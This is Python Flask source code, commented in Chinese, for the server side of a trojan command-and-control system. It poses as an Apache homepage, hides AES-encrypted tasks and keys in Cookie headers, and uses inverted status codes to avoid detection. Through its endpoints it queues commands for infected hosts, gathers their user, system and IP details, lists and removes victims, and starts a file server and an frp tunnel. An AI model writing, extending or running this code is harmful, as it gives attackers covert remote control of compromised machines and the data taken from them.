#encoding=utf-8
#作者：@破壳雏鸟
#项目地址：https://github.com/pkcn445/C2/

from base64 import b64decode, b64encode
from json import dumps, loads
from flask import Flask,request,Response,render_template
from lib.baseser import *
from lib.aes_crypt import *
from settings import *
from os import system

app = Flask(__name__)
get_payload_info = []


baseser = BaseSer() #实例化一个基本API类

@app.route("/",methods=["GET","POST"])
def index():
  """
  这是伪装的Apache主页
  """
  return Response(render_template("index.html"))

@app.route("/getkeys",methods=["POST","GET"])
def getkey():
    """
    描述：
      这个函数是用来处理秘钥下发的，秘钥的生成使用了基础类的 getkeys() 方法

    访问方法：
      url: https://实际运行的服务器IP地址和端口/getkeys

    返回数据：
      请求秘钥成功的响应状态码为 404 ,失败则为 200
      返回数据不管成功与否都是为空
      秘钥获取：通过获取响应头的 Cookie 值，经过 base64 解密即可得到秘钥
      秘钥数据解密后为：{"key":"木马唯一身份标识ID:AES秘钥"}
    """
    key = baseser.getkeys()
    rst = Response(render_template("index.html"))
    if key:
        rst.headers['Cookie'] = b64encode(dumps({"key":key}).encode("utf-8")) #json格式化后经过base64加密
        rst.status_code = 404
        rst.headers['Server'] = SERVER_AGET #设置服务器指纹信息
    else:
        rst.status_code = 200
        rst.headers["Server"] = SERVER_AGET
    return rst

@app.route("/getname",methods=["GET","POST"])
def getpayloads():
    """
    描述：
      这个函数是用来下发 payload 的，payload 放在响应头的 Cookie 部分，使用了基础类的 get_payloads() 方法
    
    访问方法：
      url: https://实际运行的服务器IP地址和端口/getname
      请求头的cookie需要为：cid=秘钥key(即你请求到的随机秘钥)
    
    返回数据：
      下发 payload 成功响应码为 404 ,否则为 200
      响应正文无数据
    
    """
    rst = Response(render_template("index.html"))
    rst.status_code = 200
    rst.headers['Server'] = SERVER_AGET
    if request.cookies:
        key = request.cookies.get("cid") #获取请求头的秘钥
        if baseser.checkpwd(key): #验证秘钥
            t = baseser.get_payloads(key)
            temp = baseser.aes_keys
            temp.update(baseser.temp_aes_keys)
            #rst.headers['Cookie'] = b64encode(dumps({"data":t}).encode("utf-8")) #将payload存放到响应头的 Cookie 部分
            rst.headers['Cookie'] = DataAesCrypt(temp[key],dumps(t)).encrypt() #对数据进行 AES 加密
            rst.status_code = 404
            if t:
                get_payload_info.append(request.remote_addr+"请求任务："+dumps(t))
        else:
            rst.status_code = 500 #证明秘钥错误，需要木马停止与服务器通信
    return rst

@app.route("/addtask",methods=["POST"])
def addtask():
    """
    描述：
      这个方法是用来添加任务的，使用了基础类的 add_task() 方法
      
    访问方法：
      url: https://实际运行的服务器IP地址和端口/addtask
      请求数据要求：{"pwd":你的密码,"key":目标主机key值,"cmd":{"sleeptime":沉睡时间,"cdm":要执行的命令}}，其中的 cmd 的值要使用 json 进行序列化后用 base64 进行加密

    响应数据：
      响应成功的状态码为 200 
      响应正文为 {"info":成功或则不成功的信息提示} 该信息使用 json 进行了序列化，读取时需要进行反序列化
    """
    data = request.form #获取请求参数字典
    if data and data.get('pwd') == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        if data.get('key') and data.get('cmd'):
            #print("data--",data)
            if baseser.add_task(data.get('key'),data.get('cmd')): #添加任务
                rst = dumps({"info":"成功添加任务!请耐心等待任务执行！","key":data.get("key")})
                #print("tasklist--",baseser.tasks_dict)
            else:
                rst = dumps({"info":"添加任务失败!","key":data.get("key")})
        else:
            rst = dumps({"info":"任务下达信息不完整!","key":data.get("key")})
    else:
        rst = dumps({"info":"秘钥验证失败!","key":data.get("key")})
    return Response(rst)

@app.route("/addrst",methods=["POST","GET"])
def addrst():
    """
    描述：
      该方法是用来接收木马执行完毕后返回来的结果的，使用了基础类的 add_rst() 方法

    访问方法:
      url: https://实际运行的服务器IP地址和端口/addrst
      请求头的cookie需要为：cid=秘钥key(即你请求到的随机秘钥)
      请求正文要求：{"data":{"localuser":你获取到的本地用户,"sys_info":你获取到的系统信息,"local_ip":你获取到的本地IP地址,"cdm":你执行过的命令,"data":木马执行后base64位加密的结果}}

    响应数据：
      执行结果记录成功服务器的响应状态码为：404 ,否则为 200
    """
    rst = Response(render_template("index.html"))
    rst.headers['Server'] = SERVER_AGET
    if request.cookies.get("cid") and baseser.checkpwd(request.cookies.get('cid')):
        #获取请求数据
        data = request.form or request.args
        if data and data.get('data'):
            try:
                temp = baseser.aes_keys
                temp.update(baseser.temp_aes_keys)
                if {request.cookies.get('cid')} & {i for i in temp.keys()} == {request.cookies.get('cid')}:
                    aeskey = temp[request.cookies.get('cid')]
                    #print(data.get('data'))
                    data = DataAesCrypt(aeskey,data.get('data')).decrypt()
                    data = loads(data)
                    #print(data)
                    data['remote_ip'] = request.remote_addr
                    if baseser.add_rst({"key":request.cookies.get('cid'),"data":data}): #检查 cid 和记录数据
                        rst.status_code = 404
                    else:
                        rst.status_code = 200
                else:
                    rst.status_code = 200
            except:
                rst.status_code = 200
        else:
            rst.status_code = 200
    else:
        rst.status_code = 200
    return rst

@app.route("/getrst",methods=["GET","POST"])
def getrst():
    """
    描述：
      该方法是客户端用来获取木马执行结果的，使用了基础类的 rst_list 列表里面记录的木马执行结果数据
      每次调用成功，rst_list 列表的数据就会减少一条，并且会记录到日志
    
    访问方法：
      url: https://实际运行的服务器IP地址和端口/getrst
      请求正文要求：{"pwd":你的密码}
    
    返回数据：
      成功则返回数据，否则返回 {"info":"认证失败！"}
      成功返回的数据：
      {target(数值):{"key":开始上线的md5值,"data":{"localuser":你获取到的本地用户,"sys_info":你获取到的系统信息,"local_ip":你获取到的本地IP地址,"cdm":你执行过的命令,"data":木马执行后base64位加密的结果,"remote_ip":目标的公网IP地址}}}
    """
    data = request.form or request.args
    c = 0
    data_dict = dict()
    #fp = open("history_execute_rst.json","a",encoding="utf-8")
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        
        if get_payload_info:
            for i in get_payload_info:
              data_dict["info%s" % (c+1)] = i
              get_payload_info.remove(i)
            return dumps(data_dict) #将数据进行 json 序列化返回
        for i in baseser.rst_list:
            data_dict["target%s" % (c+1)] = i #生成返回数据
      #      dump(i,fp) #以json格式进行存储结果
            baseser.rst_list.remove(i) #移除已经被获取过的木马执行结果
      #  fp.close()
        return dumps(data_dict) #将数据进行 json 序列化返回
    else:
        return dumps({"info":"认证失败！"})
@app.route("/getlive",methods=["GET","POST"])    
def getlive():
    """
    描述：
      该方法是用来获取已经上线的主机信息的，使用了基础类的 online_list 列表存储的主机上线信息
    
    访问方法：
      url: https://实际运行的服务器IP地址和端口/getlive
      请求正文要求：{"pwd":你的密码}
    返回数据：
      认证成功会返回目标数据，否则返回 {"info":"密码错误"}
      成功返回的数据：
      {"host-(数值)":{"key":开始上线的md5值,"data":{"localuser":你获取到的本地用户,"sys_info":你获取到的系统信息,"local_ip":你获取到的本地IP地址,"cdm":你执行过的命令,"data":木马执行后base64位加密的结果,"remote_ip":目标的公网IP地址}}}
    """
    rst = dict()
    pwd = request.form or request.args
    #print(baseser.online_list)
    if pwd and pwd.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        for i in range(len(baseser.online_list)):
            rst["host-%s" % i] = baseser.online_list[i] #拼接结果
    else:
        rst = {"info":"密码错误！"}
    return dumps({"data":rst}) #返回数据

@app.route("/killhost",methods=["GET","POST"])
def killhost():
    """
    描述：
      该方法是用来删除已经上线的主机的，调用了基础类的 del_host_info() 方法
  
    访问方法：
      url: https://实际运行的服务器IP地址和端口/killhost
      请求正文要求：{"pwd":你的密码,"key":木马的唯一key值}
  
    返回数据：
      {"info":成功或失败的提示信息}
    """
    data = request.args or request.form
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest(): #验证密码
        if data.get("key"):
            r = baseser.del_host_info(data.get("key")) #调用方法
            if r:
              rst = {"info":"删除成功"}
            else:
              rst = {"info":"删除失败!"}
        else:
            rst = {"info":"key值错误!"}
    else:
        rst = {"info":"密码错误!"}
    return dumps(rst)

@app.route("/fileserver",methods=["GET","POST"])
def fileserver():
    """
    描述：
      该方法使用来处理文件传输的，它会启动 fileserver.py 脚本
    
    访问方法：
      url: https://实际运行的服务器IP地址和端口/fileserver
      请求正文要求：{"pwd":你的密码}

    返回数据：
      状态码：成功返回 404 失败返回 200
    """
    data = request.args or request.form
    r = Response(render_template("index.html"))
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest(): #验证密码
        #杀死重复进程
        system("ps -ef |grep fileserver.py |awk '{print $2}'|xargs |awk '{print $1}' |xargs kill -9")
        system("ps -ef |grep fileserver.py |awk '{print $2}'|xargs |awk '{print $1}' |xargs kill -9")
        system("ps -ef |grep fileserver.py |awk '{print $2}'|xargs |awk '{print $1}' |xargs kill -9")
        #启动服务
        rst = system("nohup python3 ./fileserver.py &")
        #判断服务是否启动成功
        if rst == 0:
            r.status_code = 404
        else:
            r.status_code = 200
    else:
        r.status_code = 200
    return r

@app.route("/frpserver",methods=["GET","POST"])
def frpserver():
    """
    描述：
      该方法用来处理 frp 代理的自动化搭建的，它会启动 ./software/frp/frpserver 程序
    
    访问方法：
      url: http://实际运行的服务器IP地址和端口/frpserver
      请求正文要求：{"pwd":你的密码,"port":端口号}
    
    返回数据：
      状态码：成功返回 404 失败返回 200
    """
    data = request.args or request.form
    r = Response(render_template("index.html"))
    if data and data.get("pwd") == md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest():
        if data.get("port"):
            p = str(int(data.get("port").strip()) + 1)
            #写入服务端的配置文件
            with open("./software/frp/frps.ini","w",encoding="utf-8") as fp:
                fp.write("[common]\nbind_addr = 0.0.0.0\nbind_port = "+p.strip())
            #杀死重复的 frp 进程，提示：如果你自己额外部署有 frp 也可能会被杀死
            system("ps -ef |grep frpserver |awk '{print $2}'|xargs |awk '{print $1}' |xargs kill -9")
            #启动服务
            rst = system("nohup ./software/frp/frpserver -c ./software/frp/frps.ini &")
            #判断是否启动成功
            if rst == 0:
                r.status_code = 404
            else:
                r.status_code = 200
        else:
            r.status_code = 200
    else:
        r.status_code = 200
    return r

CA = ("./cakey/cert.pem","./cakey/key.pem") #引入自建的 SSL 证书
if __name__ == "__main__":
    app.run(host="0.0.0.0",port=LOCAL_PORT,ssl_context=CA)